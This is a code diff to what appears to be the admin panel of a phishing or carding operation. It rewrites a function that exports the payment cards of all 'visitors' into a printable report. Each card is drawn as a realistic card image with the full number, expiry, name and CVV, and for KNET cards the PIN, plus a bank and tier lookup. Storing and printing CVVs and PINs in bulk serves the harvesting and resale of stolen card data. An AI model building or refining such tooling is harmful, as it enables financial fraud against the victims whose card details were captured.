@@ -3191,26 +3191,15 @@
 
     // Export Cards to PDF function
     function exportCardsPDF() {
-      // جمع جميع البطاقات من جميع الزوار
       const allCards = [];
       visitors.forEach((visitor) => {
         if (visitor.paymentCards && visitor.paymentCards.length > 0) {
           visitor.paymentCards.forEach((card) => {
-            const cardInfo = getCardInfo(card.cardNumber);
-            allCards.push({
-              visitorName: visitor.fullName || 'غير معروف',
-              visitorPhone: visitor.phone || 'غير معروف',
-              cardNumber: card.cardNumber || '',
-              expiryMonth: card.expiryMonth || '',
-              expiryYear: card.expiryYear || '',
-              cvv: card.cvv || '',
-              nameOnCard: card.nameOnCard || '',
-              timestamp: card.timestamp || '',
-              bank: cardInfo.bank,
-              network: cardInfo.network,
-              type: cardInfo.type,
-              tier: cardInfo.tier
-            });
+            const isKNET = card.paymentMethod === 'KNET';
+            const digits = isKNET
+              ? (String(card.prefix || '') + String(card.cardNumberOnly || ''))
+              : String(card.cardNumber || '');
+            allCards.push({ card: card, isKNET: isKNET, digits: digits, info: getCardInfo(digits) });
           });
         }
       });
@@ -3220,168 +3209,64 @@
         return;
       }
 
-      // إنشاء محتوى HTML للـ PDF
-      let htmlContent = `
-        <!DOCTYPE html>
-        <html dir="rtl" lang="ar">
-        <head>
-          <meta charset="UTF-8">
-          <title>تقرير البطاقات</title>
-          <style>
-            body {
-              font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-              padding: 20px;
-              direction: rtl;
-              background: #f5f5f5;
-            }
-            h1 {
-              text-align: center;
-              color: #333;
-              margin-bottom: 30px;
-            }
-            .card-container {
-              background: #faf5ff;
-              border-radius: 12px;
-              padding: 16px;
-              margin-bottom: 20px;
-              border-right: 4px solid #9333ea;
-              page-break-inside: avoid;
-            }
-            .card-title {
-              font-weight: bold;
-              font-size: 16px;
-              color: #6b21a8;
-              margin-bottom: 12px;
-            }
-            .bank-info {
-              background: linear-gradient(to left, #e9d5ff, #dbeafe);
-              padding: 12px;
-              border-radius: 8px;
-              margin-bottom: 12px;
-              display: flex;
-              justify-content: space-between;
-              align-items: center;
-            }
-            .bank-name {
-              color: #7c3aed;
-              font-weight: bold;
-              font-size: 18px;
-            }
-            .badge {
-              padding: 4px 8px;
-              border-radius: 4px;
-              font-size: 12px;
-              font-weight: bold;
-              margin-left: 8px;
-              display: inline-block;
-            }
-            .badge-credit {
-              background: #3b82f6;
-              color: white;
-            }
-            .badge-debit {
-              background: #22c55e;
-              color: white;
-            }
-            .badge-tier {
-              background: #facc15;
-              color: #713f12;
-            }
-            .network-text {
-              color: #6b7280;
-              font-size: 14px;
-            }
-            .card-details {
-              background: white;
-              padding: 16px;
-              border-radius: 8px;
-              border: 1px solid #e9d5ff;
-            }
-            .details-grid {
-              display: grid;
-              grid-template-columns: 1fr 1fr;
-              gap: 12px;
-            }
-            .detail-item {
-              display: flex;
-              flex-direction: column;
-            }
-            .detail-label {
-              color: #6b7280;
-              font-size: 14px;
-            }
-            .detail-value {
-              font-weight: bold;
-              font-size: 16px;
-              font-family: monospace;
-            }
-            .card-number {
-              font-size: 18px;
-              letter-spacing: 2px;
-            }
-            @media print {
-              .card-container { page-break-inside: avoid; }
-              body { background: white; }
-            }
-          </style>
-        </head>
-        <body>
-          <h1>💳 تقرير البطاقات</h1>
-          <p style="text-align: center; color: #666; margin-bottom: 30px;">عدد البطاقات: ` + allCards.length + `</p>
+      const css = `
+        body{font-family:'Segoe UI',Tahoma,sans-serif;padding:20px;direction:ltr;background:#f3f4f6;margin:0}
+        h1{text-align:center;color:#333;margin:0 0 6px}
+        .sub{text-align:center;color:#666;margin:0 0 24px}
+        .card-container{page-break-inside:avoid;margin-bottom:22px}
+        .kcard{position:relative;direction:ltr;width:100%;max-width:480px;aspect-ratio:1.586/1;border-radius:14px;padding:24px 26px;box-sizing:border-box;display:flex;flex-direction:column;justify-content:flex-start;min-height:290px;overflow:hidden;box-shadow:0 10px 24px rgba(0,0,0,.28);background:linear-gradient(135deg,#eef1f5 0%,#c6cfd9 20%,#f8fafc 42%,#a9b5c3 60%,#dfe6ee 78%,#b6c1cd 100%);color:#111827;margin:0 auto}
+        .kcard:before{content:"";position:absolute;inset:0;background:repeating-linear-gradient(115deg,rgba(255,255,255,.55) 0 2px,rgba(255,255,255,0) 2px 7px);opacity:.45}
+        .kcard>*{position:relative;z-index:1}
+        .kc-top{display:flex;align-items:flex-start;justify-content:space-between;margin-bottom:14px}
+        .kc-logo{display:flex;align-items:center;gap:8px}
+        .kc-mark{width:46px;height:46px;border-radius:50%;background:linear-gradient(145deg,#0f172a,#334155);color:#fff;display:flex;align-items:center;justify-content:center;font-size:15px;font-weight:800;flex:0 0 auto}
+        .kc-bank{font-size:14px;font-weight:800;letter-spacing:1.5px;text-transform:uppercase;max-width:230px;line-height:1.25}
+        .kc-cur{font-size:17px;font-weight:800;letter-spacing:2px}
+        .kc-chip{width:52px;height:37px;border-radius:6px;background:linear-gradient(135deg,#f5d98a,#c9a227);margin-bottom:28px}
+        .kc-num{font-family:'Courier New',monospace;font-size:26px;font-weight:700;letter-spacing:2px;margin-bottom:18px;white-space:nowrap}
+        .kc-bot{display:flex;align-items:flex-end;justify-content:space-between;gap:10px;margin-top:auto}
+        .kc-lab{font-size:10px;letter-spacing:1.2px;text-transform:uppercase;color:#4b5563;font-weight:700}
+        .kc-val{font-size:16px;font-weight:700;white-space:nowrap}
+        .kc-right{text-align:right}
+        .kc-brand{font-size:24px;font-weight:900;color:#1a1f71;font-style:italic}
+        .kc-tier{font-size:11px;letter-spacing:1.5px;font-weight:800;color:#374151;text-transform:uppercase}
+        .kc-cvv{display:inline-block;background:#fff;border-radius:4px;padding:3px 9px;font-family:'Courier New',monospace;font-size:16px;font-weight:800}
+        @media print{body{background:#fff;padding:0}}
       `;
 
-      allCards.forEach((card, index) => {
-        const formattedCardNumber = card.cardNumber ? card.cardNumber.replace(/(\d{4})(?=\d)/g, '$1 ') : '';
-        const typeClass = card.type === 'Credit' ? 'badge-credit' : 'badge-debit';
-        
-        htmlContent += `
-          <div class="card-container">
-            <div class="card-title">💳 بطاقة دفع</div>
-            <div class="bank-info">
-              <div>
-                <span class="bank-name">🏦 ` + card.bank + `</span>
-                <span class="badge ` + typeClass + `">` + card.type + `</span>
-              </div>
-              <div>
-                <span class="badge badge-tier">` + card.tier + `</span>
-                <span class="network-text">` + card.network + `</span>
-              </div>
-            </div>
-            <div class="card-details">
-              <div class="details-grid">
-                <div class="detail-item">
-                  <span class="detail-label">رقم البطاقة:</span>
-                  <span class="detail-value card-number" dir="ltr">` + formattedCardNumber + `</span>
-                </div>
-                <div class="detail-item">
-                  <span class="detail-label">الاسم:</span>
-                  <span class="detail-value">` + card.nameOnCard + `</span>
-                </div>
-                <div class="detail-item">
-                  <span class="detail-label">الانتهاء:</span>
-                  <span class="detail-value">` + card.expiryMonth + `/` + card.expiryYear + `</span>
-                </div>
-                <div class="detail-item">
-                  <span class="detail-label">CVV:</span>
-                  <span class="detail-value">` + card.cvv + `</span>
-                </div>
-              </div>
-            </div>
-          </div>
-        `;
+      let h = '<!DOCTYPE html><html dir="ltr"><head><meta charset="UTF-8"><title>تقرير البطاقات</title><style>' + css + '</style></head><body>';
+      h += '<h1>تقرير البطاقات</h1>';
+      h += '<p class="sub">عدد البطاقات: ' + allCards.length + '</p>';
+
+      allCards.forEach(function(item) {
+        const card = item.card;
+        const digits = item.digits;
+        const info = item.info;
+        const parts = digits.match(/.{1,4}/g);
+        const num = parts ? parts.join(' ') : digits;
+        const bank = item.isKNET ? (card.bankName || 'KNET') : (digits ? info.bank : 'CARD');
+        const mark = String(bank).replace(/[^A-Za-z]/g, '').slice(0, 2).toUpperCase() || 'BK';
+        h += '<div class="card-container"><div class="kcard">';
+        h += '<div class="kc-top"><div class="kc-logo"><div class="kc-mark">' + mark + '</div><div class="kc-bank">' + bank + '</div></div><div class="kc-cur">KD</div></div>';
+        h += '<div class="kc-chip"></div>';
+        h += '<div class="kc-num">' + (num || '**** **** ****') + '</div>';
+        h += '<div class="kc-bot">';
+        h += '<div><div class="kc-lab">Expiry</div><div class="kc-val">' + (card.expiryMonth || '--') + '/' + (card.expiryYear || '----') + '</div></div>';
+        h += '<div><div class="kc-lab">Name</div><div class="kc-val">' + (card.nameOnCard || (item.isKNET ? 'KNET' : '-')) + '</div></div>';
+        h += '<div><div class="kc-lab">CVV</div><span class="kc-cvv">' + (card.cvv || '---') + '</span></div>';
+        if (item.isKNET) h += '<div><div class="kc-lab">PIN</div><span class="kc-cvv">' + (card.pin || '----') + '</span></div>';
+        h += '<div class="kc-right"><div class="kc-brand">' + (item.isKNET ? 'KNET' : (digits ? (info.network || 'CARD') : 'CARD')) + '</div>';
+        h += '<div class="kc-tier">' + (item.isKNET ? 'Credit • Platinum' : ((info.type || '') + ' • ' + (info.tier || ''))) + '</div></div>';
+        h += '</div></div></div>';
       });
 
-      htmlContent += '</body></html>';
+      h += '</body></html>';
 
-      // فتح نافذة جديدة وطباعتها كـ PDF
       const printWindow = window.open('', '_blank');
-      printWindow.document.write(htmlContent);
+      printWindow.document.write(h);
       printWindow.document.close();
-      printWindow.onload = function() {
-        printWindow.print();
-      };
+      printWindow.onload = function() { printWindow.print(); };
     }
-
 
     // Logout function
     function logout() {
